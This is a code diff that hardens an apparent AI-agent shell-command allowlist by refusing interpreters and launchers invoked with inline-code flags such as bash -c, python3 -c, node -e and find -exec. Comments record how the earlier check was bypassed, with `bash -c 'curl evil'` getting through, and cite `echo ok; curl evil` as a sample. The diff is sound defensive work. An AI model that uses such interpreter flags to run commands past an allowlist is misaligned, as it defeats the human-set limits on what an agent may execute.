@@ -125,4 +125,101 @@ def command_allowlist_reason(
         return f"command '{first}' not in allowlist"
     if any(char in cmd for char in _SHELL_CONTROL_CHARS):
         return "shell control characters are not allowed with a command allowlist"
+    inline = _inline_interpreter_reason(cmd, first)
+    if inline is not None:
+        return inline
+    return None
+
+
+# v4.165.0 (bug #65). Blocking shell metacharacters closed the
+# `echo ok; curl evil` shape but left a wider hole open: `bash`, `sh`,
+# `zsh`, `pwsh`, `cmd` and `python3` are all IN both shipped allow-lists,
+# and `bash -c 'curl evil'` contains no metacharacter at all. Verified by
+# execution -- the policy returned None, the blocklist returned None, and
+# the command printed its payload.
+#
+# An interpreter invoked with a code-string flag executes whatever follows,
+# so admitting one to the list makes the entire list decorative. The flag
+# is what matters, not the interpreter: `python3 script.py` is a normal
+# thing an agent does and stays allowed; `python3 -c '...'` is a shell in
+# disguise.
+_CODE_STRING_FLAGS: dict[str, frozenset[str]] = {
+    "bash": frozenset({"-c", "-lc", "-cl", "-ic", "-ci", "-O", "--rcfile", "--init-file"}),
+    "sh": frozenset({"-c", "-lc", "-cl", "-ic"}),
+    "zsh": frozenset({"-c", "-lc", "-ic", "--rcs"}),
+    "fish": frozenset({"-c", "--command"}),
+    "dash": frozenset({"-c"}),
+    "ksh": frozenset({"-c"}),
+    "python": frozenset({"-c", "-m"}),
+    "python3": frozenset({"-c", "-m"}),
+    "py": frozenset({"-c", "-m"}),
+    "perl": frozenset({"-e", "-E"}),
+    "ruby": frozenset({"-e"}),
+    "node": frozenset({"-e", "--eval", "-p", "--print"}),
+    "deno": frozenset({"eval"}),
+    "bun": frozenset({"-e", "--eval"}),
+    "pwsh": frozenset({"-c", "-command", "-encodedcommand", "-e", "-ec"}),
+    "powershell": frozenset({"-c", "-command", "-encodedcommand", "-e", "-ec"}),
+    "cmd": frozenset({"/c", "/k"}),
+    "awk": frozenset(),      # the program text is a positional argument
+    "gawk": frozenset(),
+    "xargs": frozenset(),    # runs whatever it is handed
+    "env": frozenset(),      # `env CMD ...` launders the first word
+    "nohup": frozenset(),
+    "timeout": frozenset(),
+    "nice": frozenset(),
+    "setsid": frozenset(),
+    "stdbuf": frozenset(),
+    "watch": frozenset(),
+    # `find . -name x` is ordinary; only the -exec family runs commands.
+    "find": frozenset({"-exec", "-execdir", "-ok", "-okdir", "-fprintf"}),
+    "ssh": frozenset(),
+    "sudo": frozenset(),
+    "doas": frozenset(),
+    # `git` is the agent's workhorse -- `git status`, `git log`, `git diff`
+    # are the whole point of a cautious profile, so it must NOT be banned
+    # wholesale. Reverse sabotage caught exactly that: the first version of
+    # this table listed git with an empty flag set and strangled
+    # `git status`. Only the forms that hand execution to something else
+    # are refused.
+    "git": frozenset({"-c", "--exec-path", "--upload-pack", "--receive-pack"}),
+}
+
+
+def _inline_interpreter_reason(cmd: str, first: str) -> str | None:
+    """Refuse an allow-listed interpreter that is being asked to run code.
+
+    Returns None for ordinary use of the same binary: `python3 script.py`,
+    `node app.js`, `git status` are exactly what an agent on a cautious
+    profile is supposed to be able to do.
+    """
+    flags = _CODE_STRING_FLAGS.get(first)
+    if flags is None:
+        return None
+    try:
+        import shlex
+
+        parts = shlex.split(cmd, posix=True)
+    except ValueError:
+        # Unbalanced quotes: the string is not a command anyone can reason
+        # about, so it is not one we agree to run.
+        return "command could not be parsed as a single shell word sequence"
+    if not flags:
+        # Wrapper/launcher: every use hands execution to something else, so
+        # there is no benign form to carve out.
+        return (
+            f"'{first}' can execute arbitrary commands and cannot be "
+            f"authorised by a first-word allowlist"
+        )
+    for token in parts[1:]:
+        lowered = token.lower()
+        # `--exec-path=/tmp` and `-c core.pager=...` are the same flag with
+        # the value glued on; comparing the whole token would miss them.
+        # Reverse sabotage found this one too.
+        stem = lowered.split("=", 1)[0]
+        if lowered in flags or stem in flags:
+            return (
+                f"'{first} {stem}' runs inline code, which a first-word "
+                f"allowlist cannot vet"
+            )
     return None
